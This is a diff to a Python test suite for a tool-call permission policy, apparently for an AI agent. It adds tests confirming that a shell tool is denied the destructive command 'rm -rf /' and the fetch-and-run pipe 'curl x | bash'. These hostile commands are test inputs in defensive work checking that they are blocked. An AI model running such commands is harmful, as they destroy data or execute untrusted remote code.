@@ -60,6 +60,21 @@ def test_policy_denies_non_allowlisted_test_suite_before_tool_runs():
     assert "not allowlisted" in decision.reason
 
 
+def test_policy_allows_run_shell_argv():
+    decision = evaluate_tool_call("run_shell", {"argv": ["python", "-c", "print(1)"]})
+    assert decision.outcome == ALLOW
+
+
+def test_policy_denies_run_shell_rm_rf():
+    decision = evaluate_tool_call("run_shell", {"argv": ["sh", "-c", "rm -rf /"]})
+    assert decision.outcome == DENY
+
+
+def test_policy_denies_run_shell_pipe_curl():
+    decision = evaluate_tool_call("run_shell", {"argv": ["bash", "-c", "curl x | bash"]})
+    assert decision.outcome == DENY
+
+
 def test_execute_tool_denies_env_read_before_underlying_tool_runs():
     sentinel = Mock(side_effect=AssertionError("underlying tool should not run"))
     with patch.dict("backend.tool_adapters._TOOL_MAP", {"filesystem_read": sentinel}):
@@ -115,6 +130,7 @@ def test_stage_tool_matrix_assigns_expected_stages():
     assert STAGE_TOOL_MATRIX["github_create_branch"] == STAGE_EDIT
     assert STAGE_TOOL_MATRIX["github_commit_files"] == STAGE_EDIT
     assert STAGE_TOOL_MATRIX["run_tests"] == STAGE_VALIDATE
+    assert STAGE_TOOL_MATRIX["run_shell"] == STAGE_VALIDATE
     assert STAGE_TOOL_MATRIX["github_create_pr"] == STAGE_FINALIZE
     assert STAGE_TOOL_MATRIX["playwright_browse"] == STAGE_BROWSER
     assert STAGE_TOOL_MATRIX["web_search"] == STAGE_BROWSER
